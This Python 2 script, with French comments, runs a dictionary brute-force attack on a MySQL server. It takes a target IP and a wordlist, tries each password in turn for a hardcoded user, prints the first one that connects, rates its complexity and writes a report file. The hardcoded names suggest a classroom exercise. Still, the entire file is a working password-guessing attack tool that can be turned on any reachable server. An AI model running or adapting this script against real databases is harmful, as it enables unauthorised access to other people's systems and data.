#!/usr/bin/env python
#-*-coding:UTF-8-*-

#Auteur: Lucas Rival
# Script qui bruteforce un serveur MySQL avec un dictionaire
#@ l'ip du serveur à tester
#@ le dictionaire

import MySQLdb,time,re,sys

server=sys.argv[1]
src=sys.argv[2]


#Fonction qui regarde la difficulté du mot de passe trouvé
#@passwd : le password à testé

def difficulty(passwd):
    minus=re.search('[a-z]',passwd)
    maj=re.search('[A-Z]',passwd)
    num=re.search('[0-9]',passwd)
    spe=re.search("[-!$%^&*()_+|~=`{}\[\]:\";'<>?,.\/]",passwd)
    diff=0
    if spe and num and maj and minus and len(passwd)>=8:
        diff=5
    elif spe and num and maj and minus:
        diff=4
    elif  num and maj and minus:
        diff=3
    elif  maj and minus:
        diff=2
    elif minus:
        diff=1
    return diff

#Fonction qui édite le rapport
#@password: le password trouvé
#@time: le temps mit pour trouver le script
#@diff: la difficulté du mot de passe

def write_report(passwd,time,diff):
    print "Ecriture du report"
    report=open('rapport.txt','a')
    report.write("le mot de passe est: "+passwd+"\n")
    time=str(time)
    report.write("temps pour trouver le mot de passe: "+time+"\n")
    diff=str(diff)
    report.write("difficulté: "+diff+"\n")
    report.close()
    print "Rapport ecrit"


#Ouvre le dico fourni en argument
file=open(src,'r')
dico=file.readlines()
file.close()
tps1 = time.clock()
#teste tout les mot de passe dans la liste dico
for passwd in dico:
    passwd=passwd.strip()
    try:
        #Tente la connexion sur le serveur donnée en paramètre si elle réussi affiche le mot de passe et génère le rapport
        lien_db=MySQLdb.connect(host=server, user="lucas",passwd=passwd,db="python_db")
        print "\nconnexion réussi"
        print "le mot de passe est:", passwd
        tps2 = time.clock()
        time=tps2-tps1
        print "temps pour trouver le mot de passe est :",time
        diff=difficulty(passwd)
        print "la difficulté du passwd est :",diff
        write_report(passwd,time,diff)
        break
    except MySQLdb.Error, e:
        #si la connexion echoue affiche des . pour montrer que le script tounr toujours
        print ".",
